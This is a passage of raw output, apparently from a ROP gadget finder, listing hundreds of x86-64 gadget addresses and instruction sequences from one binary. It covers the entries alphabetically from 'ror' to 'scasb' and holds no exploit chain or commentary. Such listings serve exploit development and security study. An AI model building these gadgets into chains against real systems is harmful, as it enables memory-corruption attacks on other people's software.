0x0000000000410a1d : ror byte ptr [rdi], 0x84 ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000475b89 : ror byte ptr [rdi], 0x84 ; nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00000000004101a1 : ror byte ptr [rdi], 0x84 ; popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000402836 : ror byte ptr [rdi], 0x84 ; ret
0x0000000000466cfb : ror byte ptr [rdi], 0x84 ; ret 0x17
0x00000000004510e7 : ror byte ptr [rdi], 0x84 ; ret 0xfffc
0x00000000004244ce : ror byte ptr [rdi], 0x84 ; retf
0x000000000044ce02 : ror byte ptr [rdi], 0x84 ; retf 0
0x000000000040b986 : ror byte ptr [rdi], 0x84 ; retf 0xffe7
0x0000000000453d7c : ror byte ptr [rdi], 0x84 ; retf 0xfffc
0x000000000044191a : ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x000000000042307f : ror byte ptr [rdi], 0x85 ; ret
0x000000000044d1df : ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x000000000047db82 : ror byte ptr [rdi], 0x85 ; ret 2
0x00000000004669ce : ror byte ptr [rdi], 0x85 ; retf
0x000000000044d2d7 : ror byte ptr [rdi], 0x85 ; retf 0xfffd
0x000000000042c01d : ror byte ptr [rdi], 0x85 ; retf 1
0x00000000004634fc : ror byte ptr [rdi], 0x85 ; retf 6
0x000000000042387f : ror byte ptr [rdi], 0x88 ; retf 1
0x0000000000467899 : ror byte ptr [rdi], 0x8f ; ret 7
0x000000000044c2dc : ror byte ptr [rdi], 0x92 ; ret 0xd029
0x000000000047f659 : ror byte ptr [rdi], 0x94 ; ret
0x000000000048114a : ror byte ptr [rdi], 0x94 ; ret 0x3d
0x000000000046daad : ror byte ptr [rdi], 0x94 ; ret 0x7f3c
0x0000000000484daf : ror byte ptr [rdi], 0x94 ; ret 0x950f
0x000000000044748e : ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000410f4b : ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x00000000004108e0 : ror byte ptr [rdi], 0x95 ; ret 0xdaf7
0x000000000046ceba : ror byte ptr [rdi], 0xb6 ; add al, 7 ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x00000000004236db : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x0000000000447905 : ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x000000000040dbd2 : ror byte ptr [rdi], 1 ; mov dh, 0x17 ; test dl, dl ; jne 0x40dbbc ; ret
0x000000000046382e : ror byte ptr [rdi], cl ; ret 0xf8c1
0x0000000000494ad8 : ror byte ptr [rip + 0xd52fffa], cl ; cli ; call rdx
0x00000000004947d4 : ror dh, 0xf9 ; call qword ptr [rax]
0x00000000004947c8 : ror dl, 1 ; stc ; jmp qword ptr [rax]
0x0000000000434fc7 : ror dword ptr [rax + 0x29], 1 ; retf 0x8148
0x00000000004853ae : ror dword ptr [rax + 1], 0xf8 ; sub rax, r8 ; ret
0x0000000000447498 : ror dword ptr [rax + 1], 0xf8 ; sub rax, rsi ; ret
0x00000000004412b4 : ror dword ptr [rax - 0x3f], 0xe1 ; and byte ptr [rax + 9], cl ; retf 0x8948
0x00000000004413d9 : ror dword ptr [rax - 0x3f], 0xe1 ; and byte ptr [rax + 9], cl ; retf 0xf48
0x000000000047399a : ror dword ptr [rax - 0x3f], 0xe1 ; and byte ptr [rax + 9], cl ; retf 0xf4c
0x000000000048ac94 : ror dword ptr [rax - 0x3f], cl ; out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x000000000046f6d6 : ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x0000000000423e27 : ror dword ptr [rax - 0x77], 1 ; ret 0xaeeb
0x0000000000479ea3 : ror dword ptr [rax - 0x77], 1 ; ret 0xd348
0x0000000000465f30 : ror dword ptr [rax - 0x77], 1 ; ret 0xe7e9
0x0000000000458e18 : ror dword ptr [rax - 0x77], 1 ; retf 0x8348
0x000000000044da80 : ror dword ptr [rax - 0x77], 5 ; shr ch, 0x26 ; add cl, ch ; retf
0x00000000004859c1 : ror dword ptr [rax - 0x77], cl ; ret
0x0000000000416d6d : ror dword ptr [rax - 0x7b], 0xd2 ; jne 0x416d67 ; ret
0x0000000000470aed : ror dword ptr [rax - 0x7b], 0xd2 ; jne 0x470ae7 ; ret
0x0000000000465a29 : ror dword ptr [rax - 0x7d], 0xe8 ; add al, 0xe9 ; retf 0xfffb
0x000000000045dce4 : ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x000000000048400d : ror dword ptr [rbp + rcx*4 + 0x14], cl ; ret
0x00000000004658eb : ror dword ptr [rcx - 0x77], 0x14 ; ret 0x8b48
0x0000000000445447 : ror dword ptr [rcx], cl ; ret 0xe074
0x000000000047c18e : ror dword ptr [rdi], 0x84 ; retf 6
0x000000000042d718 : ror dword ptr [rdi], 0x85 ; adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042de24 : ror dword ptr [rdi], 0x85 ; add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042dbf6 : ror dword ptr [rdi], 0x85 ; add eax, 0xc0310000 ; ret
0x000000000042db76 : ror dword ptr [rdi], 0x85 ; cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x000000000042deb4 : ror dword ptr [rdi], 0x85 ; je 0x42dec4 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042d9ab : ror dword ptr [rdi], 0x85 ; jno 0x42d9c0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042da73 : ror dword ptr [rdi], 0x85 ; mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000042d6f0 : ror dword ptr [rdi], 0x85 ; sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000416d6c : ror qword ptr [r8 - 0x7b], 0xd2 ; jne 0x416d68 ; ret
0x0000000000470aec : ror qword ptr [r8 - 0x7b], 0xd2 ; jne 0x470ae8 ; ret
0x00000000004018ae : sahf ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jbe 0x4018ce ; syscall
0x00000000004033fe : sahf ; mov ch, byte ptr [rbx] ; add al, ch ; stc ; retf
0x000000000043ffde : sahf ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004a72a5 : sahf ; ret 0x38ae
0x0000000000483901 : sahf ; ret 0x3948
0x000000000045c88c : sahf ; ret 0x894c
0x000000000048c884 : sahf ; ret 0xf45
0x00000000004a7ddc : sahf ; retf
0x0000000000494348 : sahf ; xchg eax, ebp ; stc ; jmp qword ptr [rax - 0x2e00066a]
0x00000000004190ee : sal bh, 0xd8 ; ret
0x0000000000495368 : sal bh, 0xfa ; call rax
0x00000000004af6c9 : sal bh, 1 ; call rsp
0x000000000049536c : sal bh, 1 ; cli ; jmp rax
0x00000000004264d7 : sal bh, 1 ; ret 0x8000
0x0000000000426397 : sal bh, 1 ; ret 0xc000
0x0000000000426257 : sal bh, 1 ; ret 0xe000
0x0000000000426117 : sal bh, 1 ; ret 0xf000
0x0000000000425fd7 : sal bh, 1 ; ret 0xf800
0x0000000000425e97 : sal bh, 1 ; ret 0xfc00
0x0000000000425d57 : sal bh, 1 ; ret 0xfe00
0x0000000000425c17 : sal bh, 1 ; ret 0xff00
0x0000000000425ad7 : sal bh, 1 ; ret 0xff80
0x0000000000425997 : sal bh, 1 ; ret 0xffc0
0x0000000000425857 : sal bh, 1 ; ret 0xffe0
0x0000000000425717 : sal bh, 1 ; ret 0xfff0
0x00000000004255d7 : sal bh, 1 ; ret 0xfff8
0x0000000000425497 : sal bh, 1 ; ret 0xfffc
0x0000000000425357 : sal bh, 1 ; ret 0xfffe
0x000000000047474f : sal bl, 1 ; ret
0x000000000047f4fd : sal bl, cl ; ret
0x000000000040dafd : sal byte ptr [rax + 0x48], 0xc7 ; ret 0xfff0
0x0000000000489811 : sal byte ptr [rax + rax*8 + 0x49], 0x83 ; ret 0xf608
0x000000000044a217 : sal byte ptr [rbp + 0x16], 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x000000000044a4e7 : sal byte ptr [rbp + 0x16], 0xb8 ; add eax, dword ptr [rax] ; add byte ptr [rax], al ; syscall
0x0000000000473bf2 : sal byte ptr [rbp + 0x2b], 0x4c ; mov eax, eax ; vzeroupper ; ret
0x00000000004826fe : sal byte ptr [rbp + 0x4f], 0x89 ; ret
0x0000000000475796 : sal byte ptr [rbp + 0x5d], 0xb8 ; add dword ptr [rcx], eax ; add byte ptr [rax], al ; syscall
0x0000000000405eab : sal byte ptr [rbp + 0xa], 0x5b ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000048f633 : sal byte ptr [rbp + 0xa], 0xf3 ; ret
0x000000000048f618 : sal byte ptr [rbp + 5], 0xf3 ; ret
0x000000000044c6a1 : sal byte ptr [rbp + 8], 1 ; nop ; mov eax, 0xca ; syscall
0x00000000004150d4 : sal byte ptr [rbp + 9], cl ; ret
0x000000000044c6b1 : sal byte ptr [rbp - 0x10], 0x5a ; pop r10 ; ret
0x0000000000417c8d : sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x0000000000447180 : sal byte ptr [rbp - 0x13], cl ; lea rax, [rcx - 1] ; ret
0x0000000000416d70 : sal byte ptr [rbp - 0x13], cl ; ret
0x00000000004267fb : sal byte ptr [rbp - 0x1e], 0x31 ; shr byte ptr [rcx], 0xc8 ; ret
0x000000000040dbd7 : sal byte ptr [rbp - 0x27], cl ; ret
0x000000000042c1dd : sal byte ptr [rbp - 0x30], 0xc5 ; std ; xlatb ; ret
0x0000000000480fb8 : sal byte ptr [rbp - 0x31], cl ; movsx eax, cl ; neg eax ; ret
0x000000000042c1d5 : sal byte ptr [rbp - 0x38], 0xc5 ; std ; xlatb ; ret 0xc085
0x000000000044102d : sal byte ptr [rbp - 0x50], 0xc5 ; std ; xlatb ; ret
0x0000000000441025 : sal byte ptr [rbp - 0x68], 0xc5 ; std ; xlatb ; ret 0xc085
0x00000000004744ab : sal byte ptr [rbp - 0xe], cl ; ret
0x00000000004190ac : sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x000000000044d796 : sal byte ptr [rbx + rbp + 0x48], 0x8b ; push rax ; or dh, dh ; ret 0x8902
0x000000000048726c : sal byte ptr [rbx + rdi + 0x48], cl ; shl edx, 5 ; add rdx, rax ; jmp 0x48728a
0x0000000000494334 : sal byte ptr [rcx + rdi*8 - 1], 0xb0 ; jne 0x49433b ; jmp rax
0x000000000044132c : sal byte ptr [rcx + rdx + 0x48], cl ; bsf eax, edx ; ret
0x000000000044f142 : sal byte ptr [rcx], 0xd2 ; add eax, 1 ; push rax ; call rbx
0x000000000044c686 : sal byte ptr [rcx], 1 ; ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x000000000040eb5c : sal byte ptr [rdx + 0x3948006b], 1 ; ret
0x00000000004738fb : sal byte ptr [rdx + 0x48], cl ; bsf eax, edx ; ret
0x000000000040040d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000044cfbb : sal byte ptr [rdx + rcx + 0x48], cl ; lea edi, [rcx + rax + 0x20] ; jmp rdx
0x0000000000441643 : sal byte ptr [rdx + rdx + 0x48], 0xff ; ret 0x2288
0x0000000000485171 : sal byte ptr [rsp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x000000000047fab9 : sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x000000000048986a : sal byte ptr [rsp + rsi*4 + 0x48], 0x83 ; ret 0xf608
0x0000000000447863 : sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000480fbd : sal edi, 0xd8 ; ret
0x0000000000479f2c : sal esi, cl ; adc dword ptr [rip + 0x20000003], 0x75 ; retf 0x5f6
0x00000000004953c0 : sar ah, 0xfa ; call rax
0x00000000004953c4 : sar ah, 1 ; cli ; jmp rax
0x000000000049539c : sar al, 1 ; cli ; push rax ; clc ; cli ; call qword ptr [rax]
0x0000000000495434 : sar bh, 0xfa ; jmp rax
0x0000000000403100 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret
0x0000000000449e23 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x000000000047fe43 : sar bh, 0xff ; lcall [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x0000000000484700 : sar bh, 0xff ; mov eax, 1 ; ret
0x0000000000402832 : sar byte ptr [rax + 0x5b], 0x85 ; ror byte ptr [rdi], 0x84 ; ret
0x000000000047bd81 : sar byte ptr [rax + 0xe], 0x5b ; ret
0x00000000004057c5 : sar byte ptr [rcx - 0x38], 0x4d ; mov edi, esp ; jmp 0x40579e
0x000000000044743e : sar byte ptr [rcx], 0xc8 ; jle 0x447480 ; movsxd rax, ecx ; ret
0x000000000044dd1d : sar byte ptr [rcx], cl ; ret
0x0000000000462297 : sar byte ptr [rcx], cl ; retf 0x147f
0x0000000000494d20 : sar byte ptr [rdx + rdi*8], 0xff ; push rax ; cmp al, 0xfa ; jmp rax
0x0000000000459196 : sar byte ptr [rdx], 0xf ; ret 0xc083
0x00000000004a7c3f : sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00000000004944d0 : sar byte ptr [rsi - 0x3f3f0007], 1 ; stc ; inc eax ; ret 0xfff9
0x00000000004953f0 : sar ch, 0xfa ; jmp rax
0x0000000000494535 : sar cl, 0xff ; and dl, al ; stc ; jmp qword ptr [rax]
0x00000000004944b5 : sar cl, 0xff ; loopne 0x494482 ; stc ; jmp rax
0x00000000004944f5 : sar cl, 0xff ; nop ; ret 0xfff9
0x00000000004953bc : sar cl, 1 ; cli ; inc eax ; cld ; cli ; call rax
0x00000000004947a1 : sar cl, cl ; call qword ptr [rax - 0x1f00062d]
0x0000000000495414 : sar dh, 0xfa ; jmp rax
0x0000000000438da3 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x438dae ; ret
0x0000000000447d79 : sar dword ptr [rsi + 0x7f], 0x23 ; vzeroupper ; ret
0x0000000000471d4c : sar eax, 2 ; lea eax, [r8 - 1] ; ret
0x000000000048877e : sar eax, 3 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004632ed : sar ecx, 1 ; dec dword ptr [rax + 0x29] ; ret
0x00000000004a79a3 : sar ecx, 1 ; jnp 0x4a7964 ; ret
0x00000000004b09b5 : sar ecx, cl ; jmp qword ptr [rdx]
0x00000000004947a5 : sar ecx, cl ; jmp rax
0x0000000000416007 : sar edx, 2 ; call 0x412265
0x0000000000471e52 : sar edx, 2 ; sub eax, edx ; ret
0x000000000042c437 : sar edx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x0000000000448233 : sar esi, 1 ; jg 0x448263 ; vzeroupper ; ret
0x00000000004483cc : sar esi, 1 ; jg 0x4483fc ; vzeroupper ; ret
0x0000000000471d4b : sar r8, 2 ; lea eax, [r8 - 1] ; ret
0x000000000048877d : sar rax, 3 ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000416006 : sar rdx, 2 ; call 0x412266
0x0000000000416005 : sar rdx, 2 ; call 0x412267
0x0000000000471e51 : sar rdx, 2 ; sub eax, edx ; ret
0x000000000042c436 : sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x00000000004634e5 : sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x000000000044af51 : sbb al, 0 ; add byte ptr [rax], al ; syscall
0x000000000046695d : sbb al, 0x29 ; ret 0xe683
0x00000000004afb78 : sbb al, 0x42 ; add byte ptr [rax], al ; hlt ; jg 0x4afb7f ; call rsp
0x0000000000467897 : sbb al, 0x85 ; ror byte ptr [rdi], 0x8f ; ret 7
0x00000000004a8ca2 : sbb al, 0x8c ; retf
0x0000000000424940 : sbb al, 0xbb ; std ; dec dword ptr [rbp - 0x7b] ; test byte ptr [rdi], 0x84 ; ret
0x0000000000494229 : sbb al, 0xf9 ; call qword ptr [rax]
0x00000000004b11a5 : sbb al, 0xfa ; call rcx
0x000000000040e142 : sbb al, 7 ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000463fc6 : sbb al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000406fd3 : sbb al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x0000000000469a6b : sbb al, byte ptr fs:[rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004785f8 : sbb al, ch ; ret 0xf87e
0x000000000040b168 : sbb al, ch ; ret 0xffaf
0x0000000000409537 : sbb al, ch ; retf
0x0000000000494680 : sbb bh, 0xf9 ; inc dword ptr [rax - 0x1f] ; stc ; jmp qword ptr [rax]
0x0000000000494221 : sbb bh, cl ; call qword ptr [rax - 0x2f0006e5]
0x00000000004a7a32 : sbb bl, byte ptr [rip + 0x30565c9] ; in eax, dx ; retf
0x00000000004a6725 : sbb bl, byte ptr [rsi] ; ret
0x0000000000481d24 : sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x0000000000485c84 : sbb byte ptr [r8], al ; add byte ptr [rax], al ; add bl, ch ; ret
0x0000000000484da9 : sbb byte ptr [r9], sil ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000475821 : sbb byte ptr [rax + 0x101], bh ; syscall
0x000000000047e361 : sbb byte ptr [rax + 0x29], cl ; ret 0x394c
0x0000000000419a81 : sbb byte ptr [rax + 0x39], cl ; ret
0x000000000045de34 : sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000041c055 : sbb byte ptr [rax + 0x39], cl ; retf 0x850f
0x0000000000481d25 : sbb byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x0000000000469372 : sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x000000000048de8a : sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x000000000048565f : sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; retf 0xc148
0x0000000000482707 : sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x000000000041fcdd : sbb byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x000000000047f865 : sbb byte ptr [rax - 0x77], cl ; or r9b, bpl ; retf 0xfffd
0x0000000000474380 : sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x000000000047fadc : sbb byte ptr [rax - 0x77], cl ; push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000416dd1 : sbb byte ptr [rax - 0x77], cl ; push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x000000000041aa2b : sbb byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000048598f : sbb byte ptr [rax - 0x77], cl ; ret
0x0000000000411dde : sbb byte ptr [rax - 0x77], cl ; retf
0x000000000041a243 : sbb byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x0000000000485c85 : sbb byte ptr [rax], al ; add byte ptr [rax], al ; add bl, ch ; ret
0x0000000000449e61 : sbb byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040a61a : sbb byte ptr [rax], al ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x000000000048a905 : sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00000000004202f8 : sbb byte ptr [rbx + 0x5d], bl ; jmp rax
0x000000000044dafc : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00000000004121a7 : sbb byte ptr [rbx + 0x5d], bl ; ret
0x0000000000418c67 : sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x0000000000471b6a : sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x00000000004589c2 : sbb byte ptr [rcx + 1], cl ; fadd qword ptr [rax - 0x7bf0ffc2] ; retf
0x000000000041a15e : sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x000000000047207e : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x000000000049017f : sbb byte ptr [rcx + rdi + 0x6d], cl ; js 0x490202 ; ret 0x8b48
0x0000000000454c48 : sbb byte ptr [rcx - 0x77], al ; ret
0x000000000040dcd0 : sbb byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x000000000041fd2b : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x0000000000484daa : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000404053 : sbb byte ptr [rdi], cl ; retf 0xd289
0x000000000048716b : sbb byte ptr [rdx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000041e52d : sbb cl, byte ptr [rax + 0x29480614] ; ror byte ptr [rax + 0x39], 1 ; ret
0x00000000004583cd : sbb cl, byte ptr [rdi] ; mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x000000000043e72d : sbb cl, byte ptr [rdi] ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044037a : sbb cl, byte ptr [rdi] ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x000000000043fb9a : sbb cl, byte ptr [rdi] ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x000000000043ff8a : sbb cl, byte ptr [rdi] ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f7aa : sbb cl, byte ptr [rdi] ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f28d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043ea6d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000043e24d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x000000000043f949 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043edad : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043e58d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043dd6d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x000000000043ef4d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x000000000043fe3a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043f65a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044076a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e0ad : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043e1e3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043eee3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ea03 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043fd3b : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044066b : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043f223 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043e523 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x000000000043e043 : sbb cl, byte ptr [rdi] ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000043ed43 : sbb cl, byte ptr [rdi] ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x000000000043fe8b : sbb cl, byte ptr [rdi] ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000043f6ab : sbb cl, byte ptr [rdi] ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000494720 : sbb dh, 0xf9 ; inc dword ptr [rax - 0x20] ; stc ; jmp qword ptr [rax]
0x000000000048e1b5 : sbb dh, bl ; ret
0x0000000000494a11 : sbb dl, bh ; call qword ptr [rax + 0x20fffa17]
0x0000000000494851 : sbb dl, bh ; call rsi
0x000000000049484d : sbb dl, bh ; inc dword ptr [rsi + 0x18] ; cli ; call rsi
0x00000000004809c7 : sbb dl, dh ; jmp r11
0x0000000000494850 : sbb dl, r15b ; call rsi
0x000000000048875b : sbb dword ptr [rax - 0x7d], ecx ; ret
0x000000000048e0a9 : sbb dword ptr [rax - 0x7d], ecx ; ret 0x8001
0x000000000044c5f4 : sbb dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x0000000000477b34 : sbb dword ptr [rbp + rcx*4 + 0x78], ecx ; add eax, ebp ; ret 0xfa85
0x0000000000461321 : sbb dword ptr [rbx - 0x52743], eax ; call qword ptr [rax]
0x00000000004a8fdd : sbb dword ptr [rbx], edx ; mov ch, 0x99 ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000466240 : sbb dword ptr [rsi + 0xf], esp ; outsd dx, dword ptr [rsi] ; retf
0x0000000000446e57 : sbb eax, -1 ; ret
0x000000000048d202 : sbb eax, 0x18c48348 ; ret
0x0000000000490240 : sbb eax, 0x22baab ; jne 0x490230 ; pop rbx ; ret
0x0000000000419fc3 : sbb eax, 0x2a ; add byte ptr [rax], al ; ret
0x00000000004a7a33 : sbb eax, 0x30565c9 ; in eax, dx ; retf
0x000000000045e844 : sbb eax, 0x39480001 ; ret
0x000000000041d488 : sbb eax, 0x5394800 ; scasd eax, dword ptr [rdi] ; ret
0x0000000000462416 : sbb eax, 0x83480001 ; clc ; dec dword ptr [rcx - 0x77] ; ret
0x00000000004557bf : sbb eax, 0x89fffac4 ; retf 0xe283
0x0000000000403f68 : sbb eax, 0xfc80f00 ; retf 0xc089
0x000000000045dcc2 : sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00000000004ad4d9 : sbb eax, dword ptr [rax] ; add byte ptr [rbx + rdx*4], dh ; idiv bh ; retf
0x0000000000407d4a : sbb eax, dword ptr [rax] ; add byte ptr [rbx - 0x7bf0fe02], al ; ret 0x1b
0x000000000040716c : sbb eax, dword ptr [rax] ; add byte ptr [rbx - 0x7bf0fe07], al ; retf 0x1b
0x000000000048286a : sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x000000000042c897 : sbb eax, eax ; or eax, 1 ; ret
0x000000000048dd8f : sbb eax, eax ; ret
0x0000000000446e55 : sbb eax, eax ; sbb eax, -1 ; ret
0x0000000000477937 : sbb eax, ebp ; ret
0x0000000000424e11 : sbb ebp, dword ptr [rip + 0xf480002] ; ret 0x66c3
0x00000000004a8b48 : sbb ebp, ebx ; retf
0x0000000000472b19 : sbb ecx, dword ptr [rbp + 0x29] ; ret 0x8948
0x000000000045137e : sbb ecx, dword ptr [rcx + 0x50895048] ; push rsp ; ret
0x0000000000403fad : sbb ecx, dword ptr [rcx - 0x7d] ; ret
0x00000000004a88d9 : sbb edi, ebp ; retf
0x0000000000419ac1 : sbb edi, ebp ; sub dword ptr [rax], eax ; ret
0x0000000000494225 : sbb edi, ecx ; call rax
0x00000000004948c5 : sbb edx, edi ; call qword ptr [rdx]
0x0000000000494809 : sbb edx, edi ; call rax
0x0000000000494805 : sbb edx, edi ; inc dword ptr [rax + 0x19] ; cli ; call rax
0x0000000000494845 : sbb edx, edi ; jmp qword ptr [rsi]
0x0000000000494a05 : sbb edx, edi ; jmp rax
0x000000000042b932 : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004403ce : scasb al, byte ptr [rdi] ; add eax, 0x83480000 ; ret 0xe910
